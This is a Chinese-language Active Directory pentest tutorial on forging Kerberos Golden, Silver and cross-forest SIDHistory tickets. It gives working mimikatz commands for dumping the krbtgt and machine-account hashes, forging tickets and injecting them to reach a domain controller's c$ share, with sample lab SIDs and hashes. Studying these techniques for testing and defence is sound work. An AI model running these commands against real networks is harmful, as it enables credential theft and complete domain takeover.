### GoldenTicket

#### 简介

Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。

**制作金票的条件：**

> 1、域名称
>
> 2、域的SID值
>
> 3、域的KRBTGT账户密码HASH 
>
> 4、伪造用户名，可以是任意的



#### 利用过程



金票的生成需要用到krbtgt的密码HASH值，可以通过mimikatz中的

```
lsadump::dcsync /OWA2010SP3.0day.org /user:krbtgt
```

命令获取krbtgt的值。

![1566542295163](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/images/1566542295163.png)

得到KRBTGT HASH之后使用mimikatz中的kerberos::golden功能生成金票golden.kiribi，即为伪造成功的TGT。

参数说明：

> /admin：伪造的用户名
>
> /domain：域名称
>
> /sid：SID值，注意是去掉最后一个-后面的值
>
> /krbtgt：krbtgt的HASH值
>
> /ticket：生成的票据名称

```
kerberos::golden /admin:administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:golden.kiribi
```

![1566543225966](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/images/1566543225966.png)



通过mimikatz中的kerberos::ptt功能（Pass The Ticket）将golden.kiribi导入内存中。



```
kerberos::purge
kerberos::ptt golden.kiribi
kerberos::list
```

![1566542805439](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/images/1566542805439.png)

此时就可以通过dir成功访问域控的共享文件夹。

```
dir \\OWA2010SP3.0day.org\c$
```

![1566543260644](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/images/1566543260644.png)



### SilverTickets

#### 简介

Silver Tickets（下面称银票）就是伪造的ST（Service Ticket），因为在TGT已经在PAC里限定了给Client授权的服务（通过SID的值），所以银票只能访问指定服务。

**制作银票的条件：**

> 1.域名称
>
> 2.域的SID值
>
> 3.域的服务账户的密码HASH（不是krbtgt，是域控）
>
> 4.伪造的用户名，可以是任意用户名，这里是silver



#### 利用过程

首先我们需要知道服务账户的密码HASH，这里同样拿域控来举例，通过mimikatz查看当前域账号administrator的HASH值。注意，这里使用的不是Administrator账号的HASH，而是OWA2010SP3$的HASH

```
sekurlsa::logonpasswords
```

![1566649973247](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/images/1566649973247.png)

这时得到了OWA2010SP3$的HASH值，通过mimikatz生成银票。

参数说明：

> /domain：当前域名称
>
> /sid：SID值，和金票一样取前面一部分
>
> /target：目标主机，这里是OWA2010SP3.0day.org
>
> /service：服务名称，这里需要访问共享文件，所以是cifs
>
> /rc4：目标主机的HASH值
>
> /user：伪造的用户名
>
> /ptt：表示的是Pass TheTicket攻击，是把生成的票据导入内存，也可以使用/ticket导出之后再使用kerberos::ptt来导入

```
kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:cifs /rc4:125445ed1d553393cce9585e64e3fa07 /user:silver /ptt
```

![1566654188946](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/images/1566654188946.png)

这时通过klist查看当前会话的kerberos票据可以看到生成的票据。

![1566654225879](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/images/1566654225879.png)

使用`dir \\OWA2010SP3.0day.org\c$`访问DC的共享文件夹。

![1566654265383](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/images/1566654265383.png)



### EnhancedGolden Tickets

在Golden Ticket部分说明可利用krbtgt的密码HASH值生成金票，从而能够获取域控权限同时能够访问域内其他主机的任何服务。但是普通的金票不能够跨域使用，也就是说金票的权限被限制在当前域内。



#### 域树与域林

在下图中 UKNOWSEC.CN 为其他两个域的根域，NEWS.UKNOWSEC.CN和 DEV.UKNOWSEC.CN 均为 UKNOWSEC.CN的子域，这三个域组成了一个域树。子域的概念可以理解为一个集团在不同业务上分公司，他们有业务重合的点并且都属于 UKNOWSEC.CN这个根域，但又独立运作。同样 TEST.COM 也是一个单独的域树，两个域树 UKONWSE.CN 和 TEST.CN 组合起来被称为一个域林。

![1566656866798](https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/images/1566656866798.png)

#### 普通金票的局限性

在上图中说到UKNOWSEC.CN为其他两个域（NEWS.UKNOWSEC.CN和DEV.UKNOWSEC.CN）的根域，根域和其他域的最大的区别就是根域对整个域林都有控制权。而域正是根据Enterprise Admins组来实现这样的权限划分。

**Enterprise Admins组**

EnterpriseAdmins组是域中用户的一个组，只存在于一个林中的根域中，这个组的成员，这里也就是UKNOWSEC.CN中的Administrator用户（不是本地的Administrator，是域中的Administrator）对域有完全管理控制权。

UKNOWSEC.CN的域控上Enterprise Admins组的RID为519.

**Domain Admins组**

子域中是不存在EnterpriseAdmins组的，在一个子域中权限最高的组就是Domain Admins组。NEWS.UKNOWSEC.CN这个子域中的Administrator用户，这个Administrator有当前域的最高权限。

#### 突破限制

普通的黄金票据被限制在当前域内，在2015年Black Hat USA中国外的研究者提出了突破域限制的增强版的黄金票据。通过域内主机在迁移时LDAP库中的SIDHistory属性中保存的上一个域的SID值制作可以跨域的金票。

如果知道根域的SID那么就可以通过子域的KRBTGT的HASH值，使用mimikatz创建具有 EnterpriseAdmins组权限（域林中的最高权限）的票据。

然后通过mimikatz重新生成包含根域SID的新的金票

```
kerberos::golden /admin:administrator /domain:news.uknowsec.cn /sid:XXX /sids:XXX /krbtgt:XXX /startoffset:0 /endin:600 /renewmax:10080 /ptt
```

Startoffset和endin分别代表偏移量和长度，renewmax表示生成的票据的最长时间。

注意这里是不知道根域UKONWSEC.CN的krbtgt的密码HASH的，使用的是子域NEWS.UKNOWSEC.CN中的KRBTGT的密码HASH。

然后就可以通过dir访问DC. UKNOWSEC的共享文件夹，此时的这个票据票是拥有整个域林的控制权的。



### Reference

<https://www.freebuf.com/articles/system/196434.html>

